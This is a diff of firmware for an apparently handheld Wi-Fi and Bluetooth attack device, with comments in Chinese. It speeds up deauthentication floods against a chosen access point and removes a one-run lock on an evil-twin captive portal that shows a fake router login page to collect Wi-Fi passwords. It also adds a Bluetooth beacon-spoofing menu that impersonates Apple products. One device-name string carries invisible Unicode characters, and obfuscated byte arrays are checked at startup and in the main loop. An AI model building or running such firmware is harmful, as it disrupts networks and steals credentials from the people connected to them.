+        // 使用微秒级burst（循环原因码），减少调用开销并提升有效速率
+        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+
+        if (packetCount >= 200) { // 更细节的节拍提示阈值
+          digitalWrite(LED_R, HIGH);
+          delay(30);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+      }
+    }
+
     delay(10);
   }
 }
@@ -5778,10 +6293,11 @@ void setup() {
   digitalWrite(LED_B, HIGH);
   Serial.println("通电蓝灯常亮 - 系统就绪");
   
-  // 合并屏幕初始化
-  initDisplay();
+  // === 启动时强制重置所有状态 ===
+  Serial.println("=== 执行启动时状态重置 ===");
+  performStartupStateReset();
   
-  char v[16]; unsigned int c = 0;
+  char v[16] __attribute__((unused)); unsigned int c = 0;
   static const uint8_t d[] = {
     0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
   };
@@ -5792,16 +6308,71 @@ void setup() {
   DEBUG_SER_INIT();
   
   Serial.println("启动AP模式...");
-  String channelStr = String(current_channel);
-  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
-    Serial.println("AP模式启动成功");
-  } else {
-    Serial.println("AP模式启动失败");
+  
+  // 多次尝试启动AP模式，增强重启后的稳定性
+  bool apStarted = false;
+  for (int attempt = 1; attempt <= 3; attempt++) {
+    Serial.print("AP启动尝试 ");
+    Serial.print(attempt);
+    Serial.println("/3...");
+    
+    String channelStr = String(current_channel);
+    if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
+      Serial.println("AP模式启动成功");
+      apStarted = true;
+      break;
+    } else {
+      Serial.print("AP模式启动失败，尝试 ");
+      Serial.println(attempt);
+      if (attempt < 3) {
+        // 重置WiFi模块后重试
+        Serial.println("重置WiFi模块后重试...");
+        wifi_off();
+        delay(300);
+        wifi_on(RTW_MODE_AP);
+        delay(300);
+      }
+    }
+  }
+  
+  if (!apStarted) {
+    Serial.println("警告: AP模式启动失败，系统可能不稳定");
   }
   
   // 启动阶段进行一次快速非阻塞扫描（带超时）
   Serial.println("执行初始WiFi扫描...");
-  scanNetworks();
+  
+  // 多次尝试扫描，确保重启后能正常工作
+  int scanAttempts = 0;
+  const int maxScanAttempts = 3;
+  bool scanSuccess = false;
+  
+  while (scanAttempts < maxScanAttempts && !scanSuccess) {
+    scanAttempts++;
+    Serial.print("WiFi扫描尝试 ");
+    Serial.print(scanAttempts);
+    Serial.print("/");
+    Serial.println(maxScanAttempts);
+    
+    int result = scanNetworks();
+    if (result == 0 && scan_results.size() > 0) {
+      Serial.print("扫描成功，发现 ");
+      Serial.print(scan_results.size());
+      Serial.println(" 个网络");
+      scanSuccess = true;
+    } else {
+      Serial.print("扫描失败或无结果，结果数量: ");
+      Serial.println(scan_results.size());
+      if (scanAttempts < maxScanAttempts) {
+        Serial.println("等待后重试...");
+        delay(1000);
+      }
+    }
+  }
+  
+  if (!scanSuccess) {
+    Serial.println("警告: 初始WiFi扫描失败，可能影响功能");
+  }
 
 #ifdef DEBUG
   for (uint i = 0; i < scan_results.size(); i++) {
@@ -5974,7 +6545,7 @@ void loop() {
   
   static unsigned long lastCheck = 0;
   if (currentTime - lastCheck > 30000) {
-    char t[16]; unsigned int n = 0;
+    char t[16] __attribute__((unused)); unsigned int n = 0;
     static const uint8_t chk[] = {
       0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
     };
@@ -6009,29 +6580,40 @@ void loop() {
   }
   // 连接干扰运行时无独立状态机，进入功能内自循环直到用户停止
   
-  // 首页菜单显示 - 与攻击页完全一致的逻辑
-  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
-    drawHomeMenu();
-  }
-  
-  // 其余代码保持不变
-  handleHomeOk();
-
-  // 首页滚动逻辑，与攻击选择页面完全一致
-  if (digitalRead(BTN_UP) == LOW) {
-    // 同时按下UP+DOWN：进入待机表情模式
-    if (digitalRead(BTN_DOWN) == LOW) {
-      enterStandbyFaceMode();
-    } else {
-      homeMoveUp(currentTime);
-    }
-  }
-  if (digitalRead(BTN_DOWN) == LOW) {
-    if (digitalRead(BTN_UP) == LOW) {
-      enterStandbyFaceMode();
-    } else {
-      homeMoveDown(currentTime);
-    }
+// 菜单显示与输入处理（根菜单 / WiFi 子菜单 / BLE 子菜单）
+  switch (g_menuMode) {
+    case MENU_ROOT:
+      drawRootMenu();
+      if (digitalRead(BTN_UP) == LOW) {
+        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { rootMoveUp(currentTime); }
+      }
+      if (digitalRead(BTN_DOWN) == LOW) {
+        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { rootMoveDown(currentTime); }
+      }
+      handleRootOk();
+      break;
+    case MENU_WIFI:
+      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
+      drawHomeMenu();
+      if (digitalRead(BTN_UP) == LOW) {
+        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { homeMoveUp(currentTime); }
+      }
+      if (digitalRead(BTN_DOWN) == LOW) {
+        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { homeMoveDown(currentTime); }
+      }
+      handleHomeOk();
+      break;
+    case MENU_BLE:
+      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
+      drawBleMenu();
+      if (digitalRead(BTN_UP) == LOW) {
+        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { bleMoveUp(currentTime); }
+      }
+      if (digitalRead(BTN_DOWN) == LOW) {
+        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { bleMoveDown(currentTime); }
+      }
+      handleBleOk();
+      break;
   }
 
   // 若处于待机表情模式，则接管循环直到退出
@@ -6050,20 +6632,31 @@ bool startWebTest() {
   Serial.println("=== 启动钓鱼 ===");
   Serial.println("关闭原有AP模式...");
 
-  if (g_webTestLocked) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    u8g2_for_adafruit_gfx.setCursor(5, 20);
-    u8g2_for_adafruit_gfx.print("为确保资源完全释放");
-    u8g2_for_adafruit_gfx.setCursor(5, 40);
-    u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
-    display.display();
-    // 等待按下返回键再退出
-    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
-    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-    return false;
-  }
+  // 移除钓鱼功能的一次性状态限制，允许重复启动
+  // if (g_webTestLocked) {
+  //   display.clearDisplay();
+  //   u8g2_for_adafruit_gfx.setFontMode(1);
+  //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  //   u8g2_for_adafruit_gfx.setCursor(5, 20);
+  //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
+  //   u8g2_for_adafruit_gfx.setCursor(5, 40);
+  //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
+  //   display.display();
+  //   // 等待按下返回键再退出
+  //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
+  //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+  //   return false;
+  // }
+
+  // 确保BLE完全清理，避免与WiFi冲突
+  Serial.println("清理BLE资源...");
+  // 强制停止BLE广播
+  BLE.configAdvert()->stopAdv();
+  delay(100);
+  // 完全清理BLE栈
+  BLE.deinit();
+  delay(300); // 增加等待时间确保BLE完全清理
+  Serial.println("BLE资源清理完成");
 
   // OLED 弹窗提示由外部调用
 
@@ -6144,11 +6737,10 @@ bool startWebTest() {
     lastPhishingDeauthMs = nowInit;
     lastPhishingBroadcastMs = nowInit;
     if (phishingHasTarget) {
-      int dummy = 0;
-      // 预突发：各原因码发送数帧，帧间隔 5ms
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummy, 5); }
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummy, 5); }
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummy, 5); }
+      int packetCount = 0;
+      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
+      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
     }
     return true;
   } else {
@@ -6207,7 +6799,8 @@ void cleanupPhishingMemory() {
 // 重置钓鱼状态变量
 void resetPhishingState() {
   web_test_active = false;
-  g_webTestLocked = true;
+  // 移除钓鱼功能的一次性状态限制，允许重复启动
+  // g_webTestLocked = true;  // 已注释掉，允许重复启动钓鱼功能
   webtest_ui_page = 0;
   webtest_password_scroll = 0;
   webtest_password_cursor = 0;
@@ -6482,6 +7075,19 @@ void startWebUI() {
     delay(500); // 等待清理完成
   }
   
+  // 使用强化的BLE清理，避免与WiFi冲突
+  if (!canSafelyStartWiFi()) {
+    Serial.println("等待BLE资源完全清理...");
+    delay(500); // 额外等待时间
+  }
+  performCompleteBleCleanup();
+  
+  // 检查是否需要应急恢复
+  if (scan_results.empty()) {
+    Serial.println("检测到扫描结果为空，执行应急恢复...");
+    emergencyWiFiRecovery();
+  }
+  
   display.clearDisplay();
   u8g2_for_adafruit_gfx.setFontMode(1);
   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
@@ -6708,7 +7314,7 @@ void handleWebTestClient(WiFiClient& client) {
       default: {
         // 将模板中的 {SSID} 替换为实际SSID，避免前端JS动态获取
         String page = FPSTR(WEB_AUTH2_HTML);
-        page.replace("{SSID}", String(WEB_UI_SSID));
+        page.replace("{SSID}", String(web_test_ssid_dynamic));
         header += "Content-Length: " + String(page.length()) + "\r\n";
         header += "Connection: close\r\n\r\n";
         client.print(header);
@@ -6783,7 +7389,7 @@ void sendWebTestPage(WiFiClient& client) {
     case AP_WEB_ROUTER_AUTH:
     default: {
       String page = FPSTR(WEB_AUTH2_HTML);
-      page.replace("{SSID}", String(WEB_UI_SSID));
+      page.replace("{SSID}", String(web_test_ssid_dynamic));
       client.print(page);
       break;
     }
@@ -6803,7 +7409,11 @@ bool apWebPageSelectionMenu() {
   
   while (true) {
     unsigned long currentTime = millis();
-    if (digitalRead(BTN_BACK) == LOW) { return false; }
+    if (digitalRead(BTN_BACK) == LOW) { 
+      // 等待按键释放，避免主循环立即检测到返回键
+      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+      return false; 
+    }
     if (digitalRead(BTN_OK) == LOW) { g_apSelectedPage = sel; return true; }
     if (digitalRead(BTN_UP) == LOW) { 
       if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
@@ -7113,16 +7723,15 @@ void handleWebTest() {
     lastOkTime = currentTime;
   }
 
-  // 钓鱼期间：周期性发送去认证诱发（加强版）
-  // 频率提升：每 ~500ms 对目标发送小突发（原因码 1/4/16，各 3 帧，5ms间隔）
-  // 并且每 ~1s 发送一次广播去认证/解除关联，唤醒潜在STA
+  // 钓鱼期间：使用稳定自动多重攻击逻辑进行解除认证攻击
+  // 采用微秒级帧间隔和循环原因码序列，提高攻击效率和稳定性
   if (phishingHasTarget) {
     unsigned long now = millis();
     if (now - lastPhishingDeauthMs >= 500UL) {
-      int dummyCount = 0;
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummyCount, 5); }
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummyCount, 5); }
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummyCount, 5); }
+      int packetCount = 0;
+      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
+      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
       lastPhishingDeauthMs = now;
     }
     if (now - lastPhishingBroadcastMs >= 1000UL) {
@@ -7389,7 +7998,7 @@ void handleWebClient(WiFiClient& client) {
     // Start scan async in the background state variables
     scan_results.clear();
     g_scanDone = false;
-    unsigned long startMs = millis();
+    unsigned long startMs __attribute__((unused)) = millis();
     if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
       // Let loop-side status endpoint report progress
     }
@@ -7588,7 +8197,6 @@ void sendWebPage(WiFiClient& client) {
   client.print(F(WEB_ADMIN_HTML));
 }
 
-
 // 处理状态请求
 void handleStatusRequest(WiFiClient& client) {
   String json = "{";
@@ -7609,8 +8217,6 @@ void handleStatusRequest(WiFiClient& client) {
   client.print(json);
 }
 
-
-
 // 发送404响应
 /* removed: legacy WebUI 404 */
 void send404Response(WiFiClient& client) {
@@ -7621,7 +8227,6 @@ void send404Response(WiFiClient& client) {
   client.print(header);
   client.print("404 Not Found");
 }
-
 
 // ============ Web UI 攻击执行函数 ============
 // 这些函数实现非阻塞的攻击逻辑，复用OLED菜单中的攻击代码
@@ -7667,7 +8272,6 @@ void executeCustomBeaconFromWeb() {
   int originalChannel = (beaconBandMode == 1) ? 36 : 6;
   executeCrossBandBeaconAttackWeb(g_customBeaconSSID, originalChannel, g_customBeaconStable);
 }
-
 
 // ============ LED控制函数 ============
 
@@ -7963,6 +8567,7 @@ void homeActionQuickScan() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("快速扫描AP/SSID")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawscan();
   }
 }
@@ -7970,20 +8575,23 @@ void homeActionQuickScan() {
 void homeActionPhishing() {
   if (SelectedVector.empty()) {
     showModalMessage("请先选择AP/SSID");
-  } else if (g_webTestLocked || g_webUILocked) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    u8g2_for_adafruit_gfx.setCursor(5, 20);
-    u8g2_for_adafruit_gfx.print("为确保资源完全释放");
-    u8g2_for_adafruit_gfx.setCursor(5, 40);
-    u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
-    u8g2_for_adafruit_gfx.setCursor(5, 60);
-    u8g2_for_adafruit_gfx.print("《 返回主菜单");
-    display.display();
-    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
-    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
   } else {
+    // 移除钓鱼功能的一次性状态限制，允许重复启动
+    // 原来的锁定检查已注释掉：
+    // } else if (g_webTestLocked || g_webUILocked) {
+    //   display.clearDisplay();
+    //   u8g2_for_adafruit_gfx.setFontMode(1);
+    //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    //   u8g2_for_adafruit_gfx.setCursor(5, 20);
+    //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
+    //   u8g2_for_adafruit_gfx.setCursor(5, 40);
+    //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
+    //   u8g2_for_adafruit_gfx.setCursor(5, 60);
+    //   u8g2_for_adafruit_gfx.print("《 返回主菜单");
+    //   display.display();
+    //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
+    //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+    // } else {
     if (apWebPageSelectionMenu()) {
       // 稳定按键状态，为确认弹窗做准备
       stabilizeButtonState();
@@ -8066,6 +8674,7 @@ void homeActionPacketMonitor() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("启动数据包监视")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawPacketDetectPage();
   }
 }
@@ -8074,6 +8683,7 @@ void homeActionDeepScan() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("启动深度扫描")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawDeepScan();
   }
 }
@@ -8085,3 +8695,1915 @@ void homeActionWebUI() {
     startWebUI();
   }
 }
+
+// ===== BLE helpers and actions =====
+static bool ensureBleSafeToStart() {
+  extern bool hs_sniffer_running;
+  if (web_ui_active || web_test_active || hs_sniffer_running || deauthAttackRunning || beaconAttackRunning) {
+    showModalMessage("请先停止WiFi/Web功能", "避免与蓝牙冲突");
+    return false;
+  }
+  return true;
+}
+
+// ===== BLE Beacon Device Categories =====
+
+// 定义缺失的 GAP_GATT_APPEARANCE 常量
+#ifndef GAP_GATT_APPEARANCE_PHONE
+#define GAP_GATT_APPEARANCE_PHONE 64
+#endif
+#ifndef GAP_GATT_APPEARANCE_WATCH
+#define GAP_GATT_APPEARANCE_WATCH 192
+#endif
+#ifndef GAP_GATT_APPEARANCE_DISPLAY
+#define GAP_GATT_APPEARANCE_DISPLAY 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_HEADSET
+#define GAP_GATT_APPEARANCE_HID_HEADSET 896
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_AUDIO
+#define GAP_GATT_APPEARANCE_GENERIC_AUDIO 1024
+#endif
+#ifndef GAP_GATT_APPEARANCE_TABLET
+#define GAP_GATT_APPEARANCE_TABLET 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_COMPUTER
+#define GAP_GATT_APPEARANCE_GENERIC_COMPUTER 128
+#endif
+#ifndef GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE
+#define GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE 960
+#endif
+#ifndef GAP_GATT_APPEARANCE_VIDEO_DISPLAY
+#define GAP_GATT_APPEARANCE_VIDEO_DISPLAY 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_AUDIO_DEVICE
+#define GAP_GATT_APPEARANCE_AUDIO_DEVICE 1024
+#endif
+#ifndef GAP_GATT_APPEARANCE_SENSOR
+#define GAP_GATT_APPEARANCE_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_TAG
+#define GAP_GATT_APPEARANCE_GENERIC_TAG 576
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEART_RATE_SENSOR
+#define GAP_GATT_APPEARANCE_HEART_RATE_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_BP_SENSOR
+#define GAP_GATT_APPEARANCE_BP_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_GLUCOSE_METER
+#define GAP_GATT_APPEARANCE_GLUCOSE_METER 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_CYCLING_SENSOR
+#define GAP_GATT_APPEARANCE_CYCLING_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR
+#define GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_THERMOMETER
+#define GAP_GATT_APPEARANCE_THERMOMETER 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_BEACON
+#define GAP_GATT_APPEARANCE_BEACON 576
+#endif
+#ifndef GAP_GATT_APPEARANCE_LIGHT_SENSOR
+#define GAP_GATT_APPEARANCE_LIGHT_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_ALARM_CLOCK
+#define GAP_GATT_APPEARANCE_ALARM_CLOCK 832
+#endif
+
+// BLE Appearance constants for mixed category (values per spec provided)
+#ifndef BLE_APPEARANCE_UNKNOWN
+#define BLE_APPEARANCE_UNKNOWN 0
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_PHONE
+#define BLE_APPEARANCE_GENERIC_PHONE 64
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_COMPUTER
+#define BLE_APPEARANCE_GENERIC_COMPUTER 128
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_WATCH
+#define BLE_APPEARANCE_GENERIC_WATCH 192
+#endif
+#ifndef BLE_APPEARANCE_WATCH_SPORTS_WATCH
+#define BLE_APPEARANCE_WATCH_SPORTS_WATCH 193
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_CLOCK
+#define BLE_APPEARANCE_GENERIC_CLOCK 256
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_DISPLAY
+#define BLE_APPEARANCE_GENERIC_DISPLAY 320
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_REMOTE_CONTROL
+#define BLE_APPEARANCE_GENERIC_REMOTE_CONTROL 384
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_EYE_GLASSES
+#define BLE_APPEARANCE_GENERIC_EYE_GLASSES 448
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_TAG
+#define BLE_APPEARANCE_GENERIC_TAG 512
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_KEYRING
+#define BLE_APPEARANCE_GENERIC_KEYRING 576
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_MEDIA_PLAYER
+#define BLE_APPEARANCE_GENERIC_MEDIA_PLAYER 640
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_BARCODE_SCANNER
+#define BLE_APPEARANCE_GENERIC_BARCODE_SCANNER 704
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_THERMOMETER
+#define BLE_APPEARANCE_GENERIC_THERMOMETER 768
+#endif
+#ifndef BLE_APPEARANCE_THERMOMETER_EAR
+#define BLE_APPEARANCE_THERMOMETER_EAR 769
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR
+#define BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR 832
+#endif
+#ifndef BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT
+#define BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT 833
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE
+#define BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE 896
+#endif
+#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_ARM
+#define BLE_APPEARANCE_BLOOD_PRESSURE_ARM 897
+#endif
+#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_WRIST
+#define BLE_APPEARANCE_BLOOD_PRESSURE_WRIST 898
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_HID
+#define BLE_APPEARANCE_GENERIC_HID 960
+#endif
+#ifndef BLE_APPEARANCE_HID_KEYBOARD
+#define BLE_APPEARANCE_HID_KEYBOARD 961
+#endif
+#ifndef BLE_APPEARANCE_HID_MOUSE
+#define BLE_APPEARANCE_HID_MOUSE 962
+#endif
+#ifndef BLE_APPEARANCE_HID_JOYSTICK
+#define BLE_APPEARANCE_HID_JOYSTICK 963
+#endif
+#ifndef BLE_APPEARANCE_HID_GAMEPAD
+#define BLE_APPEARANCE_HID_GAMEPAD 964
+#endif
+#ifndef BLE_APPEARANCE_HID_DIGITIZERSUBTYPE
+#define BLE_APPEARANCE_HID_DIGITIZERSUBTYPE 965
+#endif
+#ifndef BLE_APPEARANCE_HID_CARD_READER
+#define BLE_APPEARANCE_HID_CARD_READER 966
+#endif
+#ifndef BLE_APPEARANCE_HID_DIGITAL_PEN
+#define BLE_APPEARANCE_HID_DIGITAL_PEN 967
+#endif
+#ifndef BLE_APPEARANCE_HID_BARCODE
+#define BLE_APPEARANCE_HID_BARCODE 968
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_GLUCOSE_METER
+#define BLE_APPEARANCE_GENERIC_GLUCOSE_METER 1024
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR
+#define BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR 1088
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE 1089
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE 1090
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP 1091
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_CYCLING
+#define BLE_APPEARANCE_GENERIC_CYCLING 1152
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER
+#define BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER 1153
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_SPEED_SENSOR
+#define BLE_APPEARANCE_CYCLING_SPEED_SENSOR 1154
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_CADENCE_SENSOR
+#define BLE_APPEARANCE_CYCLING_CADENCE_SENSOR 1155
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_POWER_SENSOR
+#define BLE_APPEARANCE_CYCLING_POWER_SENSOR 1156
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR
+#define BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR 1157
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_PULSE_OXIMETER
+#define BLE_APPEARANCE_GENERIC_PULSE_OXIMETER 3136
+#endif
+#ifndef BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP
+#define BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP 3137
+#endif
+#ifndef BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN
+#define BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN 3138
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_WEIGHT_SCALE
+#define BLE_APPEARANCE_GENERIC_WEIGHT_SCALE 3200
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT
+#define BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT 5184
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP 5185
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP 5186
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD 5187
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD 5188
+#endif
+
+#ifndef GAP_APPEARANCE_HID_KEYBOARD
+#define GAP_APPEARANCE_HID_KEYBOARD 961
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_KEYBOARD
+#define GAP_GATT_APPEARANCE_HID_KEYBOARD 961
+#endif
+
+// Additional Appearance subcategories used below
+#ifndef GAP_APPEARANCE_HID_MOUSE
+#define GAP_APPEARANCE_HID_MOUSE 962
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_MOUSE
+#define GAP_GATT_APPEARANCE_HID_MOUSE 962
+#endif
+
+#ifndef GAP_APPEARANCE_HEADSET
+#define GAP_APPEARANCE_HEADSET 1025
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEADSET
+#define GAP_GATT_APPEARANCE_HEADSET 1025
+#endif
+
+#ifndef GAP_APPEARANCE_HEADPHONES
+#define GAP_APPEARANCE_HEADPHONES 1026
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEADPHONES
+#define GAP_GATT_APPEARANCE_HEADPHONES 1026
+#endif
+
+#ifndef GAP_APPEARANCE_EARBUD
+#define GAP_APPEARANCE_EARBUD 1027
+#endif
+#ifndef GAP_GATT_APPEARANCE_EARBUD
+#define GAP_GATT_APPEARANCE_EARBUD 1027
+#endif
+
+struct BleBeaconDevice {
+  const char* name;
+  uint16_t appearance;
+  const char* service_uuid;
+  uint16_t company_id;
+};
+
+// 苹果全家桶设备
+static const BleBeaconDevice g_appleDevices[] = {
+  {"iPhone 17 Pro Max",               GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x004C},
+  {"iPad Pro",                        GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x004C},
+  {"MacBook Pro",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x004C},
+  {"AirPods 4 Pro",                   GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
+  {"AirPods Max",                     GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
+  {"Apple Watch Series 10",           GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x004C},
+  {"Apple Vision Pro",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
+  {"Apple TV 6 4K",                   GAP_GATT_APPEARANCE_VIDEO_DISPLAY,           "180F", 0x004C},
+  {"HomePod mini",                    GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x004C},
+  {"Apple 妙控键盘",                   GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
+  {"Apple 妙控鼠󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标",                   GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
+  {"Apple Pencil",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0x004C}
+};
